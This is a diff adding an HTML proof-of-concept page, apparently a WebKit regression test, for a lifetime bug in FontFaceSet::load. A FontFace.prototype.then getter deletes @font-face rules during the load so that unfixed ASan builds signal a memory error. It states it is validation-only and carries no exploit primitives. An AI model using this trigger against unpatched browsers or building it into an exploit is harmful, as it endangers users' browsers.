@@ -1,0 +1,280 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>FontFaceSet matchingFaces lifetime PoC</title>
+<style>
+html, body { font: 14px/1.45 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; margin: 0; padding: 0; background: #101216; color: #eceff4; }
+main { max-width: 980px; margin: 0 auto; padding: 24px; }
+h1 { font-size: 20px; margin: 0 0 10px; }
+.warning { color: #ffd166; }
+#probe { position: absolute; left: -10000px; top: -10000px; font-size: 16px; }
+#log { white-space: pre-wrap; background: #171b22; border: 1px solid #303846; border-radius: 8px; padding: 14px; min-height: 360px; }
+button { margin: 12px 0; padding: 8px 12px; border-radius: 6px; border: 1px solid #536074; background: #242b36; color: #fff; cursor: pointer; }
+button:disabled { opacity: 0.55; cursor: default; }
+</style>
+<script>
+if (window.testRunner) {
+    testRunner.dumpAsText();
+    testRunner.waitUntilDone();
+}
+</script>
+</head>
+<body>
+<main>
+<h1>CSS Font Loading matchingFaces lifetime validation PoC</h1>
+<p class="warning">Validation-only: no heap spray, reclaim objects, ArrayBuffers, workers, wasm, network, or exploit primitives.</p>
+<button id="rerun" type="button">Run again</button>
+<div id="probe">AB</div>
+<pre id="log">POC STARTED: CSSFontFaceSet / FontFaceSet::load matchingFaces lifetime
+</pre>
+</main>
+<script>
+(function () {
+    "use strict";
+
+    const logElement = document.getElementById("log");
+    const probe = document.getElementById("probe");
+    const rerunButton = document.getElementById("rerun");
+
+    let activeStyle = null;
+    let originalThenDescriptor = null;
+    let getterInstalled = false;
+    let getterFired = false;
+    let runSerial = 0;
+    let finishedCurrentRun = false;
+
+    function log(message) {
+        logElement.textContent += message + "\n";
+    }
+
+    function resetLog() {
+        logElement.textContent = "POC STARTED: CSSFontFaceSet / FontFaceSet::load matchingFaces lifetime\n";
+    }
+
+    function cleanupThenGetter() {
+        if (!getterInstalled)
+            return;
+        getterInstalled = false;
+        try {
+            if (originalThenDescriptor)
+                Object.defineProperty(FontFace.prototype, "then", originalThenDescriptor);
+            else
+                delete FontFace.prototype.then;
+            log("cleanup: restored FontFace.prototype.then");
+        } catch (error) {
+            log("cleanup: restoring FontFace.prototype.then threw " + error.name + ": " + error.message);
+        }
+    }
+
+    function cleanupStyle() {
+        if (!activeStyle)
+            return;
+        try {
+            if (activeStyle.parentNode)
+                activeStyle.remove();
+        } catch (error) {
+            log("cleanup: style removal threw " + error.name + ": " + error.message);
+        }
+        activeStyle = null;
+    }
+
+    function complete() {
+        if (finishedCurrentRun)
+            return;
+        finishedCurrentRun = true;
+        cleanupThenGetter();
+        cleanupStyle();
+        log("DONE");
+        rerunButton.disabled = false;
+        if (window.testRunner)
+            testRunner.notifyDone();
+    }
+
+    function forceStyleAndLayout(reason) {
+        log("force-style: " + reason);
+        try {
+            // These reads are intentionally simple. In WebKit they force pending
+            // stylesheet changes through style/layout update paths before native
+            // FontFaceSet::load() resumes.
+            void document.body.offsetWidth;
+            void probe.offsetHeight;
+            void getComputedStyle(probe).fontFamily;
+            log("force-style: completed");
+        } catch (error) {
+            log("force-style: threw " + error.name + ": " + error.message);
+        }
+    }
+
+    function removeFontRulesFromThenGetter() {
+        log("then-getter: entered same-stack CSSOM mutation path");
+        if (!activeStyle) {
+            log("then-getter: active style element missing");
+            return;
+        }
+
+        const sheet = activeStyle.sheet;
+        log("then-getter: style.sheet present = " + !!sheet);
+        if (sheet) {
+            try {
+                log("then-getter: cssRules before delete = " + sheet.cssRules.length);
+                while (sheet.cssRules.length)
+                    sheet.deleteRule(0);
+                log("then-getter: cssRules after delete = " + sheet.cssRules.length);
+            } catch (error) {
+                log("then-getter: deleteRule loop threw " + error.name + ": " + error.message);
+            }
+        }
+
+        try {
+            if (activeStyle.parentNode) {
+                activeStyle.remove();
+                log("then-getter: style element removed");
+            }
+        } catch (error) {
+            log("then-getter: style element removal threw " + error.name + ": " + error.message);
+        }
+
+        forceStyleAndLayout("after @font-face deletion/removal from then getter");
+        cleanupThenGetter();
+        log("then-getter: leaving same-stack path");
+    }
+
+    function installThenGetter() {
+        originalThenDescriptor = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
+        Object.defineProperty(FontFace.prototype, "then", {
+            configurable: true,
+            get() {
+                log("FontFace.prototype.then getter fired");
+                if (!getterFired) {
+                    getterFired = true;
+                    removeFontRulesFromThenGetter();
+                }
+                return undefined;
+            }
+        });
+        getterInstalled = true;
+        log("setup: temporary FontFace.prototype.then getter installed");
+    }
+
+    function appendFontRules(family) {
+        cleanupStyle();
+        activeStyle = document.createElement("style");
+        activeStyle.textContent = `
+            @font-face {
+                font-family: '${family}';
+                src: local('Ahem'), local('Arial'), local('Helvetica'), local('Times New Roman'), local('DejaVu Sans');
+                unicode-range: U+0041;
+            }
+            @font-face {
+                font-family: '${family}';
+                src: local('Ahem'), local('Arial'), local('Helvetica'), local('Times New Roman'), local('DejaVu Sans');
+                unicode-range: U+0042;
+            }
+        `;
+        document.head.appendChild(activeStyle);
+        log("setup: appended two CSS-connected @font-face rules for family " + family);
+        log("setup: each rule uses local() sources only; Ahem is preferred for WTR");
+    }
+
+    function observeCssConnectedFaces() {
+        const observed = [];
+        try {
+            for (const face of document.fonts) {
+                observed.push(face);
+                log("setup: observed FontFace wrapper #" + observed.length + " status=" + face.status);
+                if (observed.length >= 2)
+                    break;
+            }
+        } catch (error) {
+            log("setup: iterating document.fonts threw " + error.name + ": " + error.message);
+        }
+
+        for (const face of observed) {
+            try {
+                face.loaded.then(
+                    () => log("loaded-promise: FontFace.loaded resolved"),
+                    error => log("loaded-promise: FontFace.loaded rejected: " + (error && error.name ? error.name : error))
+                );
+            } catch (error) {
+                log("setup: attaching FontFace.loaded handler threw " + error.name + ": " + error.message);
+            }
+        }
+        log("setup: observed wrappers = " + observed.length);
+        return observed;
+    }
+
+    async function runOnce() {
+        rerunButton.disabled = true;
+        finishedCurrentRun = false;
+        getterFired = false;
+        resetLog();
+        const family = "FontFaceMatchingFacesLifetimePoC" + (++runSerial);
+
+        if (!document.fonts || typeof FontFace === "undefined") {
+            log("SKIP: CSS Font Loading API unavailable");
+            complete();
+            return;
+        }
+
+        log("phase: setup");
+        appendFontRules(family);
+        forceStyleAndLayout("after @font-face insertion, before document.fonts.load");
+
+        const observed = observeCssConnectedFaces();
+        if (observed.length < 2)
+            log("note: fewer than two wrappers observed via iteration; document.fonts.load may still match multiple unicode-range faces internally");
+
+        installThenGetter();
+
+        log("phase: call document.fonts.load for text AB, requiring both unicode-range candidates");
+        let loadPromise;
+        try {
+            loadPromise = document.fonts.load("16px '" + family + "'", "AB");
+            log("phase: document.fonts.load returned promise");
+        } catch (error) {
+            log("FAIL: document.fonts.load threw " + error.name + ": " + error.message);
+            complete();
+            return;
+        }
+
+        let settled = false;
+        try {
+            await Promise.race([
+                loadPromise.then(
+                    faces => {
+                        settled = true;
+                        log("load-promise: resolved with " + faces.length + " faces");
+                    },
+                    error => {
+                        settled = true;
+                        log("load-promise: rejected: " + (error && error.name ? error.name : error));
+                    }
+                ),
+                new Promise(resolve => setTimeout(resolve, 250))
+            ]);
+        } catch (error) {
+            log("load-promise: observation threw " + error.name + ": " + error.message);
+        }
+
+        log("result: then getter fired = " + getterFired);
+        log("result: load promise settled before timeout = " + settled);
+        log("result: patched Vector<Ref<CSSFontFace>> builds should survive this path; unfixed ASan builds may signal a lifetime error before DONE");
+        complete();
+    }
+
+    rerunButton.addEventListener("click", () => {
+        runOnce().catch(error => {
+            log("UNCAUGHT: " + error.name + ": " + error.message);
+            complete();
+        });
+    });
+
+    runOnce().catch(error => {
+        log("UNCAUGHT: " + error.name + ": " + error.message);
+        complete();
+    });
+})();
+</script>
+</body>
+</html>
